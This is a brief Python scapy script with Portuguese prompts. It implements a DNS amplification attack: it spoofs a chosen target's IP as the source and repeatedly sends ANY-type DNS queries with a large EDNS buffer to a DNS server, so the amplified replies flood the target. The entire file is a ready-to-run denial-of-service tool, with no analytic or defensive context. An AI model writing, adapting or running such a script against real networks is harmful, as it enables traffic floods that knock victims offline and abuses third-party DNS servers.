from scapy.all import *
from time import sleep

alvo=input("IP do alvo: ")
dnsadd=input("Endereço do servidor DNS: ") 
host=input("Hostname a ser resolvido: ")
tempo=input("Tempo de espera entre pacotes (segundos): ")

while True:
	send(IP(src=alvo,dst=dnsadd)/UDP(sport=5005, dport=53)/DNS(rd=1,qd=DNSQR(qname=host,qtype="ALL",qclass="IN"),ar=DNSRROPT(rclass=4096)), verbose=0)
	print("!", end = '',flush=True)
	time.sleep(float(tempo))